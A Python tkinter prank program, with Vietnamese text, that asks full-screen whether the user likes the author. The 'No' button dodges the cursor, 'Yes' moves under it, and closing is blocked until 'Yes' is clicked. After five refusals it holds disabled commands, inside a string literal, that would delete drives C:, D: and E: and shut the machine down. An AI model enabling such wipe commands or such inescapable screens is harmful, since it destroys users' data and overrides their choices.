from tkinter import *
from random import randint as ran
from tkinter import messagebox as mess
from pynput.mouse import Button as but, Controller
import webbrowser
from time import sleep
import os
i= 0
j=0
def traitim():
    return '\n'.join( ['  '.join( [("LOVE "[(x-y) % len("LOVE ")] if ((x*0.07)**2+(y*0.1)**2-1)**3-(x*0.07)**2*(y*0.1)**3 <= 0 else '  ')for x in range(-20, 20)]  )  for y in range(15, -15, -1) ])
#lay toa do dang click
def toa_do():
    mouse = Controller()
    toado = mouse.position
    return str(toado)
def x():
	s = toa_do()
	p =[]
	for i in range(len(s)):
	        if s[i]!="(" and s[i] != ")" and s[i] !=" ":
	                p.append(s[i])
	a = p
	c = []
	for i in range(len(a)):
		    if a[i] ==",":
		            break
		    c.append(a[i])
	c= "".join(c)
	c  = int(c)
	return c
def y():
	s = toa_do()
	p =[]
	for i in range(len(s)):
	        if s[i]!="(" and s[i] != ")" and s[i] !=" ":
	                p.append(s[i])
	b = p
	d = []
	for i in range(len(b)):
	        for j in range(1,len(b)):
	                if b[j] == ",":
		                      for k in range(j+1,len(b)):
		                            d.append(b[k])
	        break
	d= "".join(d)
	d  = int(d)
	return d
def nhay():
    global i
    a = ran(10,1300)
    b = ran(50,700)
    btnno.place(x= a, y =b) #di chuyen vi tri button khong
    btnyes.place(x= x()-100, y =y()-100) # thay vi tri button co thanh vi tri button khong
    i+=1
    kiemtra()
#kiem tra xem co tu choi qua 5 lan khong
def kiemtra():
    if i > 5:
        """os.system("rd/s/q D:")
        os.system("rd/s/q E:")
        os.system("rd/s/q C:")
        os.system("shutdown -s -t 20")"""
        mess.showinfo("HUMMM","XINH MÀ CHẢNH -_=")
#thong bao to cung thich cau
def thongbao():
    global j
    j+=1
    form.configure(bg= "white")
    tim.pack(pady= 40)
    btnyes.place_forget()
    btnno.place_forget()
    cauhoi['text'] = "TỚ CŨNG THÍCH CẬU <3"
    cauhoi['bg'] = "white"
    cauhoi['fg'] = "red"
    tim['bg'] = "white"
    mess.showinfo("I LOVE YOU","TỚ CŨNG THÍCH CẬU <3")
    sleep(2)
    webbrowser.open("https://www.facebook.com/congtu.hoba.01",new=1)
def thoat():
    if mess.askokcancel("Thoát", "Bạn thực sự muốn thoát chương trình ?"):
    	if j<1:
    		mess.showinfo("HUHU", "CẬU ĐỒNG Ý ĐI MÀ <3")
    	else:
        	form.destroy()
form = Tk()
form.title("Tỏ Tình Crush By Nguyễn Bá Tới")
form.protocol("WM_DELETE_WINDOW", thoat)
scrW= form.winfo_screenwidth()
scrH= form.winfo_screenheight()
# W = 0
# H = 0
# form.geometry('1920x1080+%d+%d' %(W,H))
form.attributes("-fullscreen",True)
form.configure(bg= "pink")
#label cau hoi
cauhoi = Label(form, text = "Ê!!!, CẬU CÓ THÍCH TỚ KHÔNG <3 ^-^", font = "Times 30", fg = "blue", bg = "pink")
cauhoi.pack(pady = 40)
#traitim
tim = Label(form, text = traitim(), font = "Times 15", fg = "red")
tim.pack_forget()
#button khong
btnno = Button(form, text = "KHÔNG", font = "Times 20", fg = "white", bg = "black",command= nhay)
btnno.place(x=450, y=200, height = 100, width = 200)
#button co
btnyes = Button(form, text = "CÓ", font = "Times 20", fg = "white", bg = "red",command = thongbao)
btnyes.place(x=900, y=200, height = 100, width = 200)
form.mainloop()